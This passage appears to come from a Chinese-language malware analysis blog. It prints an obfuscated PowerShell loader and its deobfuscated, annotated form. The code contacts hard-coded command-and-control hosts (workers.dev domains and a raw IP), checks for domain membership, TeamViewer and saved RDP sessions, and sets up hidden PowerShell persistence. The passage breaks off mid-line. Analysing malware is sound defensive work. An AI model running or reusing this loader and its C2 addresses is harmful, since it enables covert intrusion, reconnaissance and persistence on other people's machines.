class="string">Xnrnpd+2OkHWiXeJm4wgNcwwGtkO54dfH6r&#x27;</span>,<span class="string">&#x27;pY8VVDolvV/v8orPYWIjBxJ/r1Tnn7s0Y+bs8cePi4JrCPqgPlBJRx+vyI/Z5QnMO9QxTBYpalkYN9inkG24W54w/AQ7H5DuV/VnOR/ap2cFI12+4S8WZShQh97CykUKyAT6bdetKLfGA0uJPYKeRjYVPitNIS7Xs</span></span><br><span class="line"><span class="string">rq2KCoHqhkx203a&#x27;</span>,<span class="string">&#x27;1zMa9Uyf+tQ3V+qdHR7&#x27;</span>,<span class="string">&#x27;VH+DmKRenHOHa3yh6v/hzL/1KMVzMaYMxhiGMvWtO3LR19GAc7Jb&#x27;</span>,<span class="string">&#x27;0VqmJR9XcmHcqBBQGYuuNPbtzi1Eawk4PSXlVuYZ2szIqNQKVZ&#x27;</span>,<span class="string">&#x27;6Kn4T4kq+X5td6bXO03bS2m/Z209nW9HOhWdpnLU3G1yY+5fgJ7</span></span><br><span class="line"><span class="string">7GrNYT4&#x27;</span>,<span class="string">&#x27;xW8+fhBi6aXeor6/&#x27;</span>,<span class="string">&#x27;JHtyAO0lXY&#x27;</span>,<span class="string">&#x27;yV1MHMeUO0oqzMklFkQ&#x27;</span>,<span class="string">&#x27;yTfM+JKn0UDFcMrkZrk&#x27;</span>,<span class="string">&#x27;fc+b5aFhBB/yTWOfEc1U8BQtzIsr7C89y8Vx5Rl8hCJ0NuqBJCCEQ9p&#x27;</span>,<span class="string">&#x27;JZVxtiSc&#x27;</span>,<span class="string">&#x27;fGw2mCVDh2d9&#x27;</span>,<span class="string">&#x27;KQBUYQuy2SGeXWCOadUc&#x27;</span>,<span class="string">&#x27;KrwH&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;WNcc7qZguKNfuseFrvArLgjkNSr7JCtlT0oTVUnsqNCXFBB1XGsDVbryGG&#x27;</span>,<span class="string">&#x27;/Q7o+28t/etB6/FXjTBoLiMwwDdrdfqgIdZyW2FtbjDWuA9cGQOTYUpvjznADIqrXtE6xQDT9tGMW5UXgylGVz7CongMgRXPmKfqauV9Vay2VUZoKVMoGJ8W9SmxEQdZmmTJQ74aj</span></span><br><span class="line"><span class="string">lwy451hMz15lHfIm+aqLFWwiyPTJ1VNOhyI+EOQ2QUXJHiNr&#x27;</span>,<span class="string">&#x27;hkh8qCLtgr8yCMHf&#x27;</span>,<span class="string">&#x27;fs5GBE4puqBt63wvdyfq25VrwfqlbEcvLZvjD+TLugwm&#x27;</span>,<span class="string">&#x27;Oq0FKCz8iZnLvMH+R3wzeZPlTIlcHXPS0avSOij1FFH0W2ptImBGI2TtIrnHYO1hNCvMzP+5tFCIM0cZJz</span></span><br><span class="line"><span class="string">jBjE/xQpp8R4q0o9/1IpGiMWI5CCb4RiTPT81GEz1kTt9317OKXvZhxgMq+p7K+4v6z8mfU5xU+9iglI3AJCH6efZJMHcG0seDGyR6WOq&#x27;</span>,<span class="string">&#x27;t7WT/Sjtv5F&#x27;</span>)) ,   <span class="variable">$86f::</span><span class="string">&quot;d`eCOMP`Ress&quot;</span> )) ,  (<span class="built_in">get-chIlditeM</span>  (<span class="string">&quot;variaBLE:&quot;</span>+<span class="string">&quot;16&quot;</span>+<span class="string">&quot;7U2&quot;</span>+<span class="string">&quot;x&quot;</span>)</span><br><span class="line">).<span class="string">&quot;VAL`Ue&quot;</span>::<span class="string">&quot;AsC`Ii&quot;</span>)).(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;oEnd&#x27;</span>,<span class="string">&#x27;EadT&#x27;</span>).Invoke() </span><br></pre></td></tr></table></figure><ul><li>从解密的代码中分析，这端数据替换后使用base64接码，然后解压缩，最后使用iex执行。再次输出数据解密后的数据(PS：因为powershell中换行的问题，所以命令最好一行输入，多行输入的命令可能会出错)，去混淆结果如下：</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="number">9</span>rd4&#125; = [<span class="type">type</span>](<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ronme&#x27;</span>,<span class="string">&#x27;env&#x27;</span>,<span class="string">&#x27;nt&#x27;</span>); <span class="comment">##environment</span></span><br><span class="line"><span class="variable">$</span>&#123;remotehostarr&#125; = <span class="selector-tag">@</span>(</span><br><span class="line">(<span class="string">&quot;&#123;4&#125;&#123;8&#125;&#123;5&#125;&#123;7&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;worke&#x27;</span>,<span class="string">&#x27;xd&#x27;</span>,<span class="string">&#x27;obr0.&#x27;</span>,<span class="string">&#x27;/hello.tyvb&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;tps&#x27;</span>,<span class="string">&#x27;rs.dev&#x27;</span>,<span class="string">&#x27;:/&#x27;</span>,<span class="string">&#x27;t&#x27;</span>), <span class="comment">##https://hello.tyvbxdobr0.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;11&#125;&#123;12&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;10&#125;&#123;13&#125;&#123;8&#125;&#123;4&#125;&#123;5&#125;&#123;2&#125;&#123;9&#125;&#123;14&#125;&#123;6&#125;&#123;7&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;gc.&#x27;</span>,<span class="string">&#x27;ly-sound-d&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;xogxio&#x27;</span>,<span class="string">&#x27;kers.&#x27;</span>,<span class="string">&#x27;dev&#x27;</span>,<span class="string">&#x27;e.ygr&#x27;</span>,<span class="string">&#x27;wo&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;://c&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),   </span><br><span class="line"><span class="comment">##https://curly-sound-d93e.ygrhxogxiogc.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;5&#125;&#123;1&#125;&#123;6&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;vc.workers&#x27;</span>,<span class="string">&#x27;ps://old-mud-23&#x27;</span>,<span class="string">&#x27;.de&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;htt&#x27;</span>,<span class="string">&#x27;cb.tkbizu&#x27;</span>),</span><br><span class="line"><span class="comment">##https://old-mud-23cb.tkbizulvc.workers.dev</span></span><br><span class="line">(<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;.138.&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;//45.61&#x27;</span>,<span class="string">&#x27;http:&#x27;</span>) <span class="comment">##http://45.61.138.170</span></span><br><span class="line">)</span><br><span class="line"><span class="variable">$</span>&#123;lockendpoint&#125; = (<span class="string">&quot;&#123;7&#125;&#123;1&#125;&#123;0&#125;&#123;8&#125;&#123;4&#125;&#123;3&#125;&#123;6&#125;&#123;5&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e/l&#x27;</span>,<span class="string">&#x27;=sit&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;oadlo&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;.php?r&#x27;</span>)</span><br><span class="line"><span class="comment">##web/index.php?r=site/loadlock</span></span><br><span class="line"><span class="variable">$</span>&#123;tinyendpoint&#125; = (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;oad.php&#x27;</span>) <span class="comment">##load.php&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check-singlehost</span>   ##判断服务器是否存活</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">param</span>(<span class="variable">$</span>&#123;hosttocheck&#125;)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$</span>&#123;res&#125; = (<span class="built_in">new-object</span> net.webclient).(downloadstring).invoke((<span class="variable">$</span>&#123;hosttocheck&#125; + (<span class="string">&#x27;/check/&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$</span>&#123;res&#125; <span class="operator">-eq</span> <span class="string">&#x27;ok&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-hostfromarray</span>  ##获取可连接的服务主机</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>&#123;remotehostarr&#125; = <span class="variable">$</span>&#123;remotehostarr&#125; | <span class="built_in">sort-object</span> &#123;<span class="built_in">get-random</span>&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$</span>&#123;singlehost&#125; <span class="keyword">in</span> <span class="variable">$</span>&#123;remotehostarr&#125;) &#123;</span><br><span class="line"><span class="keyword">if</span>(&amp;(<span class="string">&quot;&#123;0&#125;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;check&#x27;</span>,<span class="string">&#x27;leho&#x27;</span>,<span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;st&#x27;</span>,<span class="string">&#x27;-s&#x27;</span>)(<span class="variable">$</span>&#123;singlehost&#125;)) &#123; <span class="comment">##check-singlehost</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;singlehost&#125;</span><br><span class="line">&#125;</span><br><span class="line">.(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;start-s&#x27;</span>,<span class="string">&#x27;eep&#x27;</span>) <span class="number">3</span>  <span class="comment">##休眠</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;(<span class="string">&quot;&#123;3&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;st&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;ge&#x27;</span>,<span class="string">&#x27;t-ho&#x27;</span>,<span class="string">&#x27;omarray&#x27;</span>) <span class="comment">##get-hostfromarray 递归测试寻找可用的服务器</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isinad</span>   ##判断当前主机是否存在域</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((.(<span class="string">&quot;&#123;3&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;et-w&#x27;</span>,<span class="string">&#x27;mi&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;4&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;ersystem&#x27;</span>,<span class="string">&#x27;ut&#x27;</span>,<span class="string">&#x27;in32&#x27;</span>,<span class="string">&#x27;_comp&#x27;</span>)).<span class="string">&quot;partofdomain&quot;</span> <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) </span><br><span class="line"><span class="comment">##. get-wmiobject (win32_computersystem).&quot;partofdomain&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isteamviewerinstalled</span>  ##判断<span class="title">teamviewer</span>安装路径是否存在</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>&#123;systemdrive&#125; = (.(<span class="string">&quot;&#123;4&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;t-wmio&#x27;</span>,<span class="string">&#x27;ject&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) (<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;4&#125;&#123;5&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;gs&#x27;</span>,<span class="string">&#x27;in32&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;_operatin&#x27;</span>,<span class="string">&#x27;yste&#x27;</span>,<span class="string">&#x27;m&#x27;</span>)).<span class="string">&quot;systemdrive&quot;</span>   <span class="comment">##获取系统驱动器</span></span><br><span class="line"><span class="comment">## get-wmiobject (win32_operatingssystem)</span></span><br><span class="line"><span class="variable">$</span>&#123;twpathx86&#125; = <span class="variable">$</span>&#123;systemdrive&#125; + (((<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;1&#125;&#123;5&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ewer&#x27;</span>,<span class="string">&#x27;prog&#x27;</span>,<span class="string">&#x27;ncmncmteamvi&#x27;</span>,<span class="string">&#x27;cm&#x27;</span>,<span class="string">&#x27;:ncmn&#x27;</span>,<span class="string">&#x27;ram files&#x27;</span>)) <span class="operator">-creplace</span>  ([<span class="built_in">char</span>]<span class="number">78</span>+[<span class="built_in">char</span>]<span class="number">99</span>+[<span class="built_in">char</span>]<span class="number">109</span>),[<span class="built_in">char</span>]<span class="number">92</span>)  <span class="comment">##C::ncmncmprogram filesncmncmteamviewer</span></span><br><span class="line"><span class="variable">$</span>&#123;twpathx64&#125; = <span class="variable">$</span>&#123;systemdrive&#125; + (((<span class="string">&quot;&#123;5&#125;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;6&#125;&#123;4&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;iles (x86)&#x27;</span>,<span class="string">&#x27;lat&#x27;</span>,<span class="string">&#x27;er&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;eamview&#x27;</span>,<span class="string">&#x27;:latlatprogram &#x27;</span>,<span class="string">&#x27;latt&#x27;</span>)).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">76</span>+[<span class="built_in">char</span>]<span class="number">97</span>+[<span class="built_in">char</span>]<span class="number">116</span>),[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">92</span>)) <span class="comment">##C::latlatprogram files (x86)latlatteamviewer</span></span><br><span class="line"><span class="keyword">if</span>((.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;th&#x27;</span>,<span class="string">&#x27;tes&#x27;</span>,<span class="string">&#x27;t-pa&#x27;</span>) <span class="variable">$</span>&#123;twpathx86&#125;) <span class="operator">-or</span> (&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;ath&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>) <span class="variable">$</span>&#123;twpathx64&#125;)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get-isrdpsessions</span>  ##检查已存在的<span class="title">rdp</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>&#123;userhives&#125; = .(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ch&#x27;</span>,<span class="string">&#x27;ildi&#x27;</span>,<span class="string">&#x27;tem&#x27;</span>,<span class="string">&#x27;get-&#x27;</span>) ((<span class="string">&quot;&#123;4&#125;&#123;1&#125;&#123;6&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;y_&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;sersnvu&#x27;</span>,<span class="string">&#x27;ry::hke&#x27;</span>,<span class="string">&#x27;reg&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;st&#x27;</span>)).replace(([<span class="built_in">char</span>]<span class="number">78</span>+[<span class="built_in">char</span>]<span class="number">86</span>+[<span class="built_in">char</span>]<span class="number">117</span>),<span class="string">&#x27;\&#x27;</span>) </span><br><span class="line"><span class="literal">-erroraction</span> (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;silen&#x27;</span>,<span class="string">&#x27;ontinue&#x27;</span>,<span class="string">&#x27;lyc&#x27;</span>,<span class="string">&#x27;t&#x27;</span>) | &amp;(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;ere-o&#x27;</span>,<span class="string">&#x27;bject&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">&#123;<span class="variable">$</span>&#123;_&#125;.<span class="string">&quot;name&quot;</span> <span class="operator">-match</span> ((<span class="string">&#x27;^h&#x27;</span>+<span class="string">&#x27;k&#x27;</span>+<span class="string">&#x27;ey_&#x27;</span>+<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;ser&#x27;</span>+<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;6&#x27;</span>+<span class="string">&#x27;z06&#x27;</span>+<span class="string">&#x27;z0s-1-5-21-[6&#x27;</span>+<span class="string">&#x27;z0d&#x27;</span>+<span class="string">&#x27;6z0-]+0ky&#x27;</span>).<span class="string">&quot;replace&quot;</span>(<span class="string">&#x27;6z0&#x27;</span>,[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">92</span>).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">48</span>+[<span class="built_in">char</span>]<span class="number">107</span>+[<span class="built_in">char</span>]<span class="number">89</span>),<span class="string">&#x27;$&#x27;</span>))&#125;</span><br><span class="line">    <span class="comment">## get-childitem (registry:hkey_usersnvu).replace(&quot;NVu&quot;,\) -erroraction (silentlycontinue) | &amp;(where-object) &#123;$&#123;_&#125;.&quot;name&quot; -match(&quot;^hkey_users6z06z0s-1-5-21-[6z0d6z0-]+0ky&quot;).replace(&quot;6z0&quot;,&#x27;\&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;rdppathending&#125; = (((<span class="string">&quot;&#123;3&#125;&#123;9&#125;&#123;12&#125;&#123;1&#125;&#123;4&#125;&#123;10&#125;&#123;0&#125;&#123;11&#125;&#123;2&#125;&#123;8&#125;&#123;6&#125;&#123;7&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;rosoftudhte&#x27;</span>,<span class="string">&#x27;war&#x27;</span>,<span class="string">&#x27;inal&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;eu&#x27;</span>,<span class="string">&#x27;lientudhservers&#x27;</span>,<span class="string">&#x27;ser&#x27;</span>,<span class="string">&#x27;ver c&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;dhmic&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;hsoft&#x27;</span>)) <span class="operator">-replace</span>  ([<span class="built_in">char</span>]<span class="number">117</span>+[<span class="built_in">char</span>]<span class="number">68</span>+[<span class="built_in">char</span>]<span class="number">72</span>),[<span class="built_in">char</span>]<span class="number">92</span>)</span><br><span class="line"><span class="comment">##\software\microsoft\terminal server client\servers</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$</span>&#123;hive&#125; <span class="keyword">in</span> <span class="variable">$</span>&#123;userhives&#125;) &#123;</span><br><span class="line"><span class="variable">$</span>&#123;microsoftrdppath&#125; = .(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;jo&#x27;</span>,<span class="string">&#x27;in-path&#x27;</span>) <span class="variable">$</span>&#123;hive&#125;.<span class="string">&quot;pspath&quot;</span> <span class="string">&quot;\<span class="variable">$rdppathending</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> (.(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;-path&#x27;</span>,<span class="string">&#x27;tes&#x27;</span>) <span class="variable">$</span>&#123;microsoftrdppath&#125;) &#123;</span><br><span class="line"><span class="variable">$</span>&#123;allrdpsessions&#125; = .(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;em&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;et-childit&#x27;</span>) <span class="variable">$</span>&#123;microsoftrdppath&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$</span>&#123;allrdpsessions&#125;.<span class="string">&quot;length&quot;</span> <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;true&#125;</span><br><span class="line">&#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;false&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">persist-lock</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">param</span>(<span class="variable">$</span>&#123;<span class="keyword">data</span>&#125;)</span><br><span class="line"><span class="variable">$</span>&#123;rand&#125; = <span class="operator">-join</span> ((<span class="number">48</span>..<span class="number">57</span>) + (<span class="number">97</span>..<span class="number">122</span>) | .(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-random&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="literal">-count</span> <span class="number">8</span> | &amp;(<span class="string">&#x27;%&#x27;</span>) &#123;[<span class="built_in">char</span>]<span class="variable">$</span>&#123;_&#125;&#125;)</span><br><span class="line"><span class="variable">$</span>&#123;randname&#125; =  <span class="variable">$</span>&#123;rand&#125; + (<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ini&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="variable">$</span>&#123;destination&#125; =   <span class="variable">$</span>&#123;<span class="number">9</span>rd4&#125;::(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;et&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;olderpath&#x27;</span>).invoke((<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;at&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;applic&#x27;</span>,<span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;data&#x27;</span>)) + <span class="string">&#x27;\&#x27;</span> + <span class="variable">$</span>&#123;randname&#125;</span><br><span class="line">&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;add-c&#x27;</span>,<span class="string">&#x27;nt&#x27;</span>,<span class="string">&#x27;onte&#x27;</span>) <span class="variable">$</span>&#123;destination&#125; <span class="variable">$</span>&#123;<span class="keyword">data</span>&#125;</span><br><span class="line"><span class="variable">$</span>&#123;autorunstring&#125; = (((<span class="string">&quot;&#123;0&#125;&#123;4&#125;&#123;2&#125;&#123;14&#125;&#123;10&#125;&#123;5&#125;&#123;13&#125;&#123;12&#125;&#123;9&#125;&#123;11&#125;&#123;8&#125;&#123;3&#125;&#123;7&#125;&#123;1&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;cmd /c power^shel&#x27;</span>,<span class="string">&#x27;aw mbz&#x27;</span>,<span class="string">&#x27;tyle hidde&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;l -windows&#x27;</span>,<span class="string">&#x27;-nop &#x27;</span>,<span class="string">&#x27;mbz&#x27;</span>,<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;tent&#x27;</span>,<span class="string">&#x27;t-&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;con&#x27;</span>,<span class="string">&#x27;odkge&#x27;</span>,<span class="string">&#x27;-c &#x27;</span>,<span class="string">&#x27;n&#x27;</span>))<span class="operator">-replace</span> ([<span class="built_in">char</span>]<span class="number">77</span>+[<span class="built_in">char</span>]<span class="number">66</span>+[<span class="built_in">char</span>]<span class="number">90</span>),[<span class="built_in">char</span>]<span class="number">39</span>  -</span><br><span class="line">creplace([<span class="built_in">char</span>]<span class="number">111</span>+[<span class="built_in">char</span>]<span 